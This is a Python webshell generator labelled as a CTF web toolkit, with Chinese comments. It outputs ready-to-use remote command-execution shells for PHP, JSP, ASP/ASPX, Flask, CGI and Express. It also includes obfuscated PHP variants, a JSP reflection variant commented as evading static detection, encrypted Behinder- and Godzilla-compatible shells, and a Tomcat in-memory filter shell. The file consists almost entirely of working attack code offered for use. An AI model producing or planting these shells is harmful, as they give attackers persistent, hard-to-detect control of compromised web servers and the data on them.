"""
CTF Web Toolkit - Webshell Generator
支持：PHP / JSP / ASP / ASPX / Python / Node.js
变形混淆、冰蝎/哥斯拉兼容 shell
"""

import base64
import os
import random
import string
from typing import Optional
from core.utils import ok, info, section

# ══════════════════════════════════════════════
#  PHP Webshell
# ══════════════════════════════════════════════

class PHPShell:

    # ── 基础一句话 ────────────────────────────
    @staticmethod
    def basic(password: str = "cmd") -> str:
        return f'<?php @eval($_POST["{password}"]);?>'

    @staticmethod
    def system(password: str = "cmd") -> str:
        return f'<?php system($_GET["{password}"]);?>'

    @staticmethod
    def passthru(password: str = "cmd") -> str:
        return f'<?php @passthru($_POST["{password}"]);?>'

    @staticmethod
    def assert_shell(password: str = "cmd") -> str:
        return f'<?php @assert($_POST["{password}"]);?>'

    @staticmethod
    def preg_shell(password: str = "cmd") -> str:
        return f'<?php preg_replace("/.*/e",$_POST["{password}"],"");?>'

    # ── 功能型 webshell ───────────────────────
    @staticmethod
    def full_featured(password: str = "pass") -> str:
        """带文件管理功能的完整 PHP webshell"""
        return f'''<?php
$p="{password}";
if(!isset($_POST[$p]))die();
$c=$_POST[$p];
$f=isset($_POST["f"])?$_POST["f"]:"";
$act=isset($_POST["act"])?$_POST["act"]:"cmd";
if($act=="cmd"){{echo "<pre>".shell_exec($c)."</pre>";}}
elseif($act=="read"){{echo file_get_contents($f);}}
elseif($act=="write"){{file_put_contents($f,$c);echo "ok";}}
elseif($act=="ls"){{print_r(scandir($f?$f:"."));}}
elseif($act=="info"){{phpinfo();}}
?>'''

    # ── 混淆变形 ──────────────────────────────
    @staticmethod
    def base64_obf(password: str = "cmd") -> str:
        """base64 解码执行"""
        func = base64.b64encode(b"assert").decode()
        return (
            f'<?php\n'
            f'$f=base64_decode("{func}");\n'
            f'$f($_POST["{password}"]);\n'
            f'?>'
        )

    @staticmethod
    def hex_obf(password: str = "cmd") -> str:
        """十六进制混淆"""
        code = f'$_POST["{password}"]'
        func_hex = "".join(f"\\x{ord(c):02x}" for c in "assert")
        return f'<?php $f="{func_hex}";$f({code});?>'

    @staticmethod
    def str_split_obf(password: str = "cmd") -> str:
        """字符串拼接混淆"""
        return (
            f'<?php\n'
            f'$a="sy"."stem";\n'
            f'$a($_POST["{password}"]);\n'
            f'?>'
        )

    @staticmethod
    def variable_func_obf(password: str = "cmd") -> str:
        """变量函数 + 数组混淆"""
        rand = "".join(random.choices(string.ascii_lowercase, k=6))
        return (
            f'<?php\n'
            f'${rand}=str_replace("X","","sXyXsXtXeXm");\n'
            f'${rand}($_POST["{password}"]);\n'
            f'?>'
        )

    @staticmethod
    def callback_obf(password: str = "cmd") -> str:
        """array_map 回调执行"""
        return (
            f'<?php\n'
            f'$a=$_POST["{password}"];\n'
            f'array_map("system",array($a));\n'
            f'?>'
        )

    @staticmethod
    def create_function_obf(password: str = "cmd") -> str:
        """create_function 执行（PHP < 8）"""
        return (
            f'<?php\n'
            f'$f=create_function("","eval($_POST[\\"{password}\\"]);" );\n'
            f'$f();\n'
            f'?>'
        )

    @staticmethod
    def no_letter() -> str:
        """无字母 webshell（仅特殊字符 + 数字）"""
        # 利用自增运算生成函数名
        return r'''<?php
$_=[];$_=@"$_";$_=$_["!"=="@"];$__=$_;
$___=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$____=$_;$____++;$____++;$____++;$____++;$____++;$____++;$____++;
$_____=$_;$_____++;$_____++;$_____++;$_____++;$_____++;$_____++;
$______=$_;$______++;$______++;$______++;$______++;$______++;
$_______=$_;$_______++;$_______++;$_______++;$_______++;$_______++;$_______++;$_______++;$_______++;$_______++;$_______++;$_______++;$_______++;$_______++;$_______++;$_______++;$_______++;$_______++;$_______++;$_______++;
$f=$___.$____.${$_______.$______.$_____.$____.$___};
$f(${$_______.$______.$_____.$____.$___}["_"]);
?>'''

    @staticmethod
    def gzip_obf(password: str = "cmd", code: Optional[str] = None) -> bytes:
        """gzip 压缩混淆（返回 bytes）"""
        import zlib
        if code is None:
            code = f'<?php @eval($_POST["{password}"]);?>'
        b64 = base64.b64encode(zlib.compress(code.encode())).decode()
        wrapper = (
            f'<?php\n'
            f'eval(gzuncompress(base64_decode("{b64}")));\n'
            f'?>'
        )
        return wrapper.encode()

    # ── 冰蝎 4.x 兼容 shell ──────────────────
    @staticmethod
    def behinder(password: str = "rebeyond") -> str:
        """冰蝎 4.x PHP shell（AES-256-CBC 加密通信）"""
        key_md5 = __import__("hashlib").md5(password.encode()).hexdigest()[:16]
        return f'''<?php
@error_reporting(0);
session_start();
$key="{key_md5}";
$_SESSION["k"]=$key;
session_write_close();
$post=file_get_contents("php://input");
if(!extension_loaded("openssl")){{
    $t="base64_"."decode";
    $post=$t(substr($post,16));
    for($i=0;$i<strlen($post);$i++){{
        $post[$i]=$post[$i]^$key[$i+1&15];
    }}
}}else{{
    $post=openssl_decrypt(substr($post,16),"AES-128-CBC",$key,OPENSSL_RAW_DATA,substr($post,0,16));
}}
$arr=explode("|",$post);
$func=$arr[0];
$params=array_slice($arr,1);
class C{{public function __invoke($p){{eval($p);}}}};
@call_user_func(new C(),$params[0]);
?>'''

    # ── 哥斯拉兼容 shell ──────────────────────
    @staticmethod
    def godzilla(password: str = "pass", key: str = "key") -> str:
        """哥斯拉 PHP shell"""
        return f'''<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){{
    for($i=0;$i<strlen($D);$i++){{
        $c=$K[$i+1&15];
        $D[$i]=$D[$i]^$c;
    }}
    return $D;
}}
$pass="{password}";
$payloadName="payload";
$key="{key}";
if(isset($_POST[$pass])){{
    $data=encode(base64_decode($_POST[$pass]),$key);
    if(isset($_SESSION[$payloadName])){{
        $payload=encode($_SESSION[$payloadName],$key);
        eval($payload);
        echo substr(md5($pass.$key),0,16);
        echo base64_encode(encode(@run($data),$key));
        echo substr(md5($pass.$key),16);
    }}else{{
        if(substr(md5($pass.$key),0,16)===substr($data,0,16)){{
            $sessionDe=encode(substr($data,16),$key);
            $_SESSION[$payloadName]=$sessionDe;
            echo substr(md5($pass.$key),0,16);
            echo substr(md5($pass.$key),16);
        }}
    }}
}}
?>'''


# ══════════════════════════════════════════════
#  JSP Webshell
# ══════════════════════════════════════════════

class JSPShell:

    @staticmethod
    def basic(password: str = "cmd") -> str:
        return f'''<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("{password}");
if(cmd != null){{
    Process p = Runtime.getRuntime().exec(cmd);
    InputStream in = p.getInputStream();
    StringBuilder sb = new StringBuilder();
    int c;
    while((c=in.read())!=-1) sb.append((char)c);
    out.println("<pre>"+sb.toString()+"</pre>");
}}
%>'''

    @staticmethod
    def reflect(password: str = "cmd") -> str:
        """反射执行（绕过静态检测）"""
        return f'''<%@ page import="java.lang.reflect.*,java.io.*" %>
<%
String cmd = request.getParameter("{password}");
if(cmd != null){{
    Class rt = Class.forName("java.lang.Runtime");
    Method exec = rt.getMethod("exec", String.class);
    Process p = (Process)exec.invoke(rt.getMethod("getRuntime").invoke(null), cmd);
    InputStream in = p.getInputStream();
    byte[] b = new byte[1024]; int n;
    StringBuilder sb = new StringBuilder();
    while((n=in.read(b))!=-1) sb.append(new String(b,0,n));
    out.println("<pre>"+sb+"</pre>");
}}
%>'''

    @staticmethod
    def thread_shell(password: str = "cmd") -> str:
        """内存马注入模板（Tomcat Filter 型）"""
        return f'''<%@ page import="java.io.*,javax.servlet.*,javax.servlet.http.*" %>
<%
class MemShell implements Filter {{
    public void init(FilterConfig c) throws ServletException {{}}
    public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain)
            throws IOException, ServletException {{
        HttpServletRequest r = (HttpServletRequest)req;
        String c = r.getParameter("{password}");
        if(c != null){{
            Process p = Runtime.getRuntime().exec(new String[]{{"/bin/bash","-c",c}});
            InputStream in = p.getInputStream();
            byte[] b = new byte[1024]; int n;
            while((n=in.read(b))!=-1) res.getWriter().write(new String(b,0,n));
        }} else chain.doFilter(req, res);
    }}
    public void destroy(){{}}
}}
// 注册 Filter（需要 Tomcat 容器）
ServletContext ctx = config.getServletContext();
javax.servlet.FilterRegistration.Dynamic fr = ctx.addFilter("MemShell", new MemShell());
fr.addMappingForUrlPatterns(null, false, "/*");
out.println("Memory Shell Injected");
%>'''

    @staticmethod
    def behinder() -> str:
        """冰蝎 JSP shell"""
        return '''<%@ page import="java.util.*,javax.crypto.*,javax.crypto.spec.*" %>
<%!
class U extends ClassLoader{
    U(ClassLoader c){super(c);}
    public Class g(byte[] b){return super.defineClass(b,0,b.length);}
}
%>
<%
if(request.getMethod().equals("POST")){
    String k="e45e329feb5d925b";
    session.putValue("u",k);
    Cipher c=Cipher.getInstance("AES");
    c.init(2,new SecretKeySpec(k.getBytes(),"AES"));
    new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);
}
%>'''


# ══════════════════════════════════════════════
#  ASP / ASPX Webshell
# ══════════════════════════════════════════════

class ASPShell:

    @staticmethod
    def basic_asp(password: str = "cmd") -> str:
        return f'''<%
Dim cmd, shell
cmd = Request.Form("{password}")
If cmd <> "" Then
    Set shell = CreateObject("WScript.Shell")
    Set exec = shell.Exec("cmd /c " & cmd)
    Response.Write "<pre>" & exec.StdOut.ReadAll() & "</pre>"
End If
%>'''

    @staticmethod
    def basic_aspx(password: str = "cmd") -> str:
        return f'''<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e){{
    string cmd = Request["{password}"];
    if(!string.IsNullOrEmpty(cmd)){{
        ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + cmd);
        psi.RedirectStandardOutput = true;
        psi.UseShellExecute = false;
        Process p = Process.Start(psi);
        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
    }}
}}
</script>'''

    @staticmethod
    def eval_aspx(password: str = "cmd") -> str:
        """Eval 型 ASPX"""
        return f'''<%@ Page Language="C#" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e){{
    if(Request["{password}"] != null){{
        HttpContext ctx = HttpContext.Current;
        System.Web.UI.Page p = ctx.Handler as System.Web.UI.Page;
        p.GetType().InvokeMember("eval", System.Reflection.BindingFlags.InvokeMethod, null, p, new object[]{{Request["{password}"]}});
    }}
}}
</script>'''


# ══════════════════════════════════════════════
#  Python Webshell（Flask/Django 场景）
# ══════════════════════════════════════════════

class PythonShell:

    @staticmethod
    def flask_shell(password: str = "cmd", secret: str = "secret123") -> str:
        """Flask 路由型 shell"""
        return f'''from flask import Flask, request
import subprocess, os
app = Flask(__name__)
app.secret_key = "{secret}"

@app.route("/shell", methods=["GET","POST"])
def shell():
    p = request.values.get("{password}")
    if not p:
        return "403"
    r = subprocess.run(p, shell=True, capture_output=True, text=True)
    return "<pre>" + r.stdout + r.stderr + "</pre>"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
'''

    @staticmethod
    def cgi_shell(password: str = "cmd") -> str:
        """Python CGI shell"""
        return f'''#!/usr/bin/env python3
import cgi, subprocess, sys
print("Content-Type: text/html")
print()
form = cgi.FieldStorage()
cmd = form.getvalue("{password}", "")
if cmd:
    r = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    print("<pre>" + r.stdout + r.stderr + "</pre>")
'''


# ══════════════════════════════════════════════
#  Node.js Webshell
# ══════════════════════════════════════════════

class NodeShell:

    @staticmethod
    def express_shell(password: str = "cmd") -> str:
        return f'''const express = require("express");
const {{ exec }} = require("child_process");
const app = express();
app.use(express.urlencoded({{ extended: true }}));

app.all("/shell", (req, res) => {{
    const cmd = req.query.{password} || req.body.{password};
    if (!cmd) return res.send("403");
    exec(cmd, (e, stdout, stderr) => {{
        res.send("<pre>" + stdout + stderr + "</pre>");
    }});
}});

app.listen(3000, "0.0.0.0");
'''


# ══════════════════════════════════════════════
#  Webshell 生成入口
# ══════════════════════════════════════════════

GENERATORS = {
    "php_basic":         lambda pw: PHPShell.basic(pw).encode(),
    "php_system":        lambda pw: PHPShell.system(pw).encode(),
    "php_assert":        lambda pw: PHPShell.assert_shell(pw).encode(),
    "php_full":          lambda pw: PHPShell.full_featured(pw).encode(),
    "php_b64":           lambda pw: PHPShell.base64_obf(pw).encode(),
    "php_hex":           lambda pw: PHPShell.hex_obf(pw).encode(),
    "php_split":         lambda pw: PHPShell.str_split_obf(pw).encode(),
    "php_variable":      lambda pw: PHPShell.variable_func_obf(pw).encode(),
    "php_callback":      lambda pw: PHPShell.callback_obf(pw).encode(),
    "php_gzip":          lambda pw: PHPShell.gzip_obf(pw),
    "php_noletter":      lambda pw: PHPShell.no_letter().encode(),
    "php_behinder":      lambda pw: PHPShell.behinder(pw).encode(),
    "php_godzilla":      lambda pw: PHPShell.godzilla(pw).encode(),
    "jsp_basic":         lambda pw: JSPShell.basic(pw).encode(),
    "jsp_reflect":       lambda pw: JSPShell.reflect(pw).encode(),
    "jsp_behinder":      lambda pw: JSPShell.behinder().encode(),
    "asp_basic":         lambda pw: ASPShell.basic_asp(pw).encode(),
    "aspx_basic":        lambda pw: ASPShell.basic_aspx(pw).encode(),
    "aspx_eval":         lambda pw: ASPShell.eval_aspx(pw).encode(),
    "python_flask":      lambda pw: PythonShell.flask_shell(pw).encode(),
    "python_cgi":        lambda pw: PythonShell.cgi_shell(pw).encode(),
    "node_express":      lambda pw: NodeShell.express_shell(pw).encode(),
}

# 扩展名映射
EXT_MAP = {
    "php": ".php", "jsp": ".jsp", "asp": ".asp",
    "aspx": ".aspx", "python": ".py", "node": ".js",
}


def generate(shell_type: str, password: str = "cmd",
             output_path: Optional[str] = None) -> bytes:
    """生成指定类型的 webshell"""
    section(f"Webshell 生成: {shell_type}")

    gen = GENERATORS.get(shell_type)
    if not gen:
        info(f"可用类型: {', '.join(GENERATORS.keys())}")
        return b""

    code = gen(password)
    ok(f"  类型: {shell_type}")
    ok(f"  密码参数: {password}")
    ok(f"  大小: {len(code)} bytes")

    if output_path:
        with open(output_path, "wb") as f:
            f.write(code)
        ok(f"  已保存: {output_path}")
    else:
        print("\n" + "─" * 60)
        print(code.decode(errors="replace"))
        print("─" * 60 + "\n")

    return code


def list_shells():
    """列出所有可用 shell 类型"""
    section("可用 Webshell 类型")
    categories = {}
    for name in GENERATORS:
        cat = name.split("_")[0]
        categories.setdefault(cat, []).append(name)
    for cat, shells in categories.items():
        info(f"  {cat.upper()}: {', '.join(shells)}")
